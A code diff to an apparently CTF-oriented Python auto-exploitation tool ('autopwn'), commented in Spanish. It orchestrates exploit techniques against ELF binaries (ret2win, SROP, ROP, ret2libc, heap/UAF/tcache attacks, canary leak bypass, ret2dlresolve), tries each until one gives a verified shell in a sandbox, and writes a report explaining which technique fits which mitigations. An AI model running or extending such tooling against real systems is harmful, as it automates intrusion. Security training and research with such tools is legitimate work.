@@ -26,6 +26,12 @@ class AutopwnResult:
     win_exploit: bool = False
     ai_plan: str = ""
     ai_conclusion: str = ""
+    # contexto del binario (defensas/primitivas), para que el informe refleje POR QUE cada tecnica
+    arch: str = ""
+    bits: str = ""
+    mit: dict = field(default_factory=dict)      # nx/pic/canary/relro, tal cual los da checksec
+    sinks: List[str] = field(default_factory=list)
+    has_win: bool = False
 
 
 def autopwn(binary: str, config=None, store=None,
@@ -57,6 +63,10 @@ def autopwn(binary: str, config=None, store=None,
     sink_names = sinks.meta.get("sinks", []) if sinks.ok else []
     log(f"[recon] sinks: {', '.join(sink_names) or 'ninguno'}")
     learn(f"sinks: {sink_names}")
+
+    # guarda el contexto estructurado para el informe (no solo en la traza)
+    res.arch, res.bits, res.mit, res.sinks = str(arch), str(bits), dict(mit), list(sink_names)
+    res.has_win = find_win(binary) is not None
 
     gad = reg.get("r2_rop").run(filter="pop rdi") if reg.get("r2_rop") else None
     has_pop_rdi = bool(gad and gad.ok and gad.meta.get("count", 0) > 0)
@@ -93,7 +103,11 @@ def autopwn(binary: str, config=None, store=None,
 
     # combo A: ret2win (build + sandbox verify)
     is_pie = str(mit.get("pic", "")).lower() in ("true", "1")
-    if want("ret2win") and win is not None:
+    canary_on = str(mit.get("canary", "")).lower() in ("true", "1")
+    # Un canary detiene el overflow lineal ANTES del `ret`, asi que el ret2win directo no puede
+    # funcionar: seria un intento de sandbox fallido garantizado. Con canary + win() la ruta
+    # correcta es el bypass por fuga (combo G, autocanary), no el ret2win directo.
+    if want("ret2win") and win is not None and not canary_on:
         log("[combo] ret2win: construyendo y verificando en sandbox..." + (" (PIE)" if is_pie else ""))
         try:
             if is_pie:
@@ -113,27 +127,55 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("ret2win", False, str(e)))
             log(f"[combo] ret2win error: {e}")
+    elif want("ret2win") and win is not None and canary_on:
+        log("[combo] ret2win: canary activo -> el overflow lineal se omite, se usa el bypass por fuga (combo canary)")
     elif want("ret2win"):
         log("[combo] ret2win: no hay funcion gift -> se omite")
 
-    # combo B: ROP chain (ret2libc / execve)
-    if want("rop-chain"):
-      log("[combo] cadena ROP: intentando construir...")
+    # combo A2: SROP FIRST on a no-PIE binary with no gift. autosrop is cheap (it bails fast when
+    # there is no `pop rax`+syscall+in-binary '/bin/sh') and, when it applies, verifies in one shot
+    # -- whereas the generic rop-chain below sweeps execve offsets slowly before falling back to
+    # SROP internally. Trying the dedicated fast path first keeps gadget-poor static binaries (srop,
+    # staticrop) within the trainer's per-binary budget.
+    if run and want("srop") and not is_pie and win is None and not res.win_exploit:
+        log("[combo] SROP: sigreturn -> execve('/bin/sh') (sandbox)...")
+        try:
+            from .autosrop import autosrop
+            rs = autosrop(binary)
+            verdict = True if rs.get("verified") else (None if rs.get("ok") else False)
+            res.attempts.append(("srop", verdict, rs.get("detail") or rs.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rs.get("verified"))
+            log(f"[combo] SROP -> {'SHELL VERIFICADA' if rs.get('verified') else 'no verificado'}")
+            learn(f"srop verified={rs.get('verified')} {rs.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("srop", False, str(e)))
+
+    # combo B: ROP chain (ret2libc / execve). On a PIE binary the base must be resolved first, so
+    # use the PIE-aware ROP verifier; otherwise the static/no-PIE ROP builder (with string staging
+    # + SROP). Both verify by getting a real shell in the sandbox. Skipped once we already have a
+    # verified shell -- no point spending the slow execve-offset sweep after SROP/ret2win won.
+    if want("rop-chain") and not res.win_exploit:
+      log("[combo] cadena ROP: intentando construir..." + (" (PIE)" if is_pie else ""))
       try:
-        from .autopoc import autorop
-        rr = autorop(binary, run=run)
+        if is_pie:
+            from .autopie import autopie_rop
+            rr = autopie_rop(binary, run=run)
+        else:
+            from .autopoc import autorop
+            rr = autorop(binary, run=run)
         verdict = True if rr.get("verified") else (None if rr.get("ok") else False)
         detail = (rr.get("strategy", "") + (" -> SHELL verificada" if rr.get("verified") else
-                  " (construida)" if rr.get("ok") else "")) or rr.get("note", "")
+                  " (construida)" if rr.get("ok") else "")) or rr.get("detail") or rr.get("note", "")
         res.attempts.append(("rop-chain", verdict, detail or rr.get("note", "")))
         res.win_exploit = res.win_exploit or bool(rr.get("verified"))
         log(f"[combo] cadena ROP -> {'SHELL VERIFICADA' if rr.get('verified') else ('construida' if rr.get('ok') else 'no automatica')}")
-        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy')} offset={rr.get('offset')}")
+        learn(f"rop verified={rr.get('verified')} strategy={rr.get('strategy') or rr.get('detail')}")
       except Exception as e:
         res.attempts.append(("rop-chain", False, str(e)))
 
-    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell
-    if want("ret2libc"):
+    # combo B2: ret2libc with leak (dynamic binaries), verified by getting a shell. Skipped once a
+    # shell is already verified.
+    if want("ret2libc") and not res.win_exploit:
         log("[combo] ret2libc con leak (fuga libc -> system, sandbox)...")
         try:
             from .autolibc import autolibc
@@ -200,6 +242,72 @@ def autopwn(binary: str, config=None, store=None,
         except Exception as e:
             res.attempts.append(("heap-corruption", False, str(e)))
 
+    # combo F: heap-to-shell families (menu-driven). Cheap ELF-symbol applicability pre-checks
+    # avoid wasted sandbox runs; each driver verifies by getting a REAL shell (not just a crash).
+    if run:
+        try:
+            from .autoheap import autoheap_shell, _heap_shell_applicable
+            from .autouaf import autouaf_shell, _uaf_applicable
+            from .autotcachedup import autotcachedup_shell, _tcache_dup_applicable
+            from .autowow import autowow_shell, _wow_applicable
+            heap_combos = []
+            if want("heap-shell") and _heap_shell_applicable(binary):
+                heap_combos.append(("heap-shell", autoheap_shell, "tcache poison -> free@GOT=win"))
+            if want("uaf-funcptr") and _uaf_applicable(binary):
+                heap_combos.append(("uaf-funcptr", autouaf_shell, "UAF reuso de chunk -> funcptr=win"))
+            if want("tcache-dup") and _tcache_dup_applicable(binary):
+                heap_combos.append(("tcache-dup", autotcachedup_shell, "tcache dup -> GOT=system"))
+            if want("write-what-where") and _wow_applicable(binary):
+                heap_combos.append(("write-what-where", autowow_shell, "indice sin comprobar -> GOT=win"))
+        except Exception as e:
+            heap_combos = []
+            log(f"[combo] heap-shell families no disponibles: {e}")
+        for name, fn, desc in heap_combos:
+            log(f"[combo] {name}: {desc} (sandbox)...")
+            try:
+                rx = fn(binary)
+                verdict = True if rx.get("verified") else (None if rx.get("ok") else False)
+                res.attempts.append((name, verdict, rx.get("detail") or rx.get("note", "")))
+                res.win_exploit = res.win_exploit or bool(rx.get("verified"))
+                log(f"[combo] {name} -> {'SHELL VERIFICADA' if rx.get('verified') else 'no verificado'}")
+                learn(f"{name} verified={rx.get('verified')} {rx.get('detail','')}")
+            except Exception as e:
+                res.attempts.append((name, False, str(e)))
+
+    # combo G: stack-canary bypass by leak (canary present + a gift win()). autocanary leaks the
+    # canary via a %s echo, then overflows past it to win().
+    if run and want("canary") and canary_on and win is not None:
+        log("[combo] canary: fuga del canary + overflow a win (sandbox)...")
+        try:
+            from .autocanary import autocanary
+            rc = autocanary(binary)
+            verdict = True if rc.get("verified") else (None if rc.get("ok") else False)
+            res.attempts.append(("canary-bypass", verdict, rc.get("detail") or rc.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rc.get("verified"))
+            log(f"[combo] canary -> {'SHELL VERIFICADA' if rc.get('verified') else 'no verificado'}")
+            learn(f"canary-bypass verified={rc.get('verified')} {rc.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("canary-bypass", False, str(e)))
+
+    # combo H: ret2dlresolve -- last resort for a dynamic, no-PIE binary with NO gift and NO leak
+    # (no win, no system in it): forge the linker's resolver structures to call system('/bin/sh')
+    # without leaking libc. Only worth trying when the simpler routes don't apply, so gate on
+    # dynamic + no-PIE + no win(); the driver re-checks RELRO/gadgets and degrades honestly.
+    relro_full = "full" in str(mit.get("relro", "")).lower()
+    if (run and want("dlresolve") and not is_pie and not relro_full and win is None
+            and not res.win_exploit and "system" not in sink_names):
+        log("[combo] ret2dlresolve: shell sin leak forjando el resolver dinamico (sandbox)...")
+        try:
+            from .autodlresolve import autodlresolve
+            rd = autodlresolve(binary)
+            verdict = True if rd.get("verified") else (None if rd.get("ok") else False)
+            res.attempts.append(("ret2dlresolve", verdict, rd.get("detail") or rd.get("note", "")))
+            res.win_exploit = res.win_exploit or bool(rd.get("verified"))
+            log(f"[combo] ret2dlresolve -> {'SHELL VERIFICADA' if rd.get('verified') else 'no verificado'}")
+            learn(f"ret2dlresolve verified={rd.get('verified')} {rd.get('detail','')}")
+        except Exception as e:
+            res.attempts.append(("ret2dlresolve", False, str(e)))
+
     log("[fin] combinaciones probadas: " + ", ".join(a[0] for a in res.attempts))
     return res
 
@@ -238,12 +346,61 @@ def _ai_conclude(llm, res) -> str:
         return ""
 
 
+def _flag(v) -> bool:
+    return str(v).lower() in ("true", "1")
+
+
+def _why(mit: dict, has_win: bool, technique: str) -> str:
+    """Razon 'defensa -> tecnica': por que ESTA tecnica es la adecuada para este contexto."""
+    t = (technique or "").lower()
+    pie = _flag(mit.get("pic")); can = _flag(mit.get("canary"))
+    if "canary" in t:
+        return "canary ACTIVO + win() + buffer impreso -> fuga del canary, reescritura y overflow a win()"
+    if "ret2win" in t:
+        return ("win() presente" + (" con PIE -> se resuelve la base en sandbox" if pie
+                else " sin canary -> retorno directo a win() (direccion fija)"))
+    if "ret2libc" in t:
+        return "sin win(): fuga de libc (puts@GOT) -> base -> system('/bin/sh')"
+    if "srop" in t:            # antes de 'rop' (substring): SROP es una tecnica distinta
+        return "binario pobre en gadgets con gadget syscall + '/bin/sh' -> SROP: un rt_sigreturn restaura TODOS los registros desde un frame forjado y ejecuta execve('/bin/sh')"
+    if "rop" in t:
+        return ("sin win()/system directo -> cadena ROP execve por syscall"
+                + (" (PIE: base resuelta en sandbox)" if pie else ""))
+    if "format" in t:
+        return "printf(entrada) controlado -> escritura via %n (GOT o retorno segun RELRO)"
+    if "heap" in t or "tcache" in t or "uaf" in t:
+        return "primitiva de heap (UAF/tcache) -> secuestro de puntero/GOT a win()/system"
+    if "wow" in t or "write" in t:
+        return "escritura arbitraria (indice sin check) -> GOT de funcion llamada despues = win()"
+    if "dlresolve" in t:
+        return "dinamico no-PIE sin win()/system ni leak -> se forjan las estructuras del resolver dinamico para llamar a system('/bin/sh') SIN fuga de libc"
+    return "seleccionada segun las defensas y primitivas observadas"
+
+
 def render_autopwn(res: AutopwnResult, lang: str = "es") -> str:
     out = [f"## Auto-explotacion de `{res.binary}`\n"]
     if res.win_exploit:
         techs = [n for n, ok, _ in res.attempts if ok is True]
         out.append("> EXPLOIT VERIFICADO: se ejecuto un exploit (" + ", ".join(techs) +
                    ") en sandbox y se consiguio el objetivo.\n")
+    # Contexto (defensas/primitivas): refleja POR QUE se eligio cada tecnica, no solo el resultado
+    if res.mit or res.arch:
+        m = res.mit or {}
+        defs = []
+        defs.append("NX " + ("ON" if _flag(m.get("nx")) else "off"))
+        defs.append("PIE " + ("ON" if _flag(m.get("pic")) else "off"))
+        defs.append("canary " + ("ON" if _flag(m.get("canary")) else "off"))
+        if m.get("relro"):
+            defs.append("RELRO " + str(m.get("relro")))
+        out.append("### Contexto del binario (defensas detectadas)\n")
+        out.append(f"- arquitectura: **{res.arch or '?'} {res.bits or '?'}-bit**")
+        out.append(f"- mitigaciones: **{' · '.join(defs)}**")
+        out.append(f"- funcion gift `win()`: **{'si' if res.has_win else 'no'}**")
+        out.append(f"- sinks peligrosos: {', '.join(res.sinks) if res.sinks else 'ninguno'}")
+        if res.win_exploit:
+            techs = [n for n, ok, _ in res.attempts if ok is True]
+            out.append("- **por que la tecnica elegida**: " + _why(res.mit, res.has_win, techs[0] if techs else ""))
+        out.append("")
     out.append(f"- hallazgos verificados: {res.verified_findings}")
     if res.ai_plan:
         out.append("\n### Plan de la IA (que probar segun lo observado)\n" + res.ai_plan)
@@ -262,10 +419,14 @@ def render_autopwn(res: AutopwnResult, lang: str = "es") -> str:
 
 def autopwn_to_json(res: "AutopwnResult") -> str:
     import json
+    techs = [n for n, ok, _ in res.attempts if ok is True]
     return json.dumps({
         "binary": res.binary,
+        "context": {"arch": res.arch, "bits": res.bits, "mitigations": res.mit,
+                    "sinks": res.sinks, "has_win": res.has_win},
         "verified_findings": res.verified_findings,
         "exploit_verified": res.win_exploit,
+        "rationale": (_why(res.mit, res.has_win, techs[0]) if (res.win_exploit and techs) else ""),
         "attempts": [{"technique": n, "result": ("works" if ok is True else
                      ("no" if ok is False else "possible")), "detail": d}
                      for n, ok, d in res.attempts],
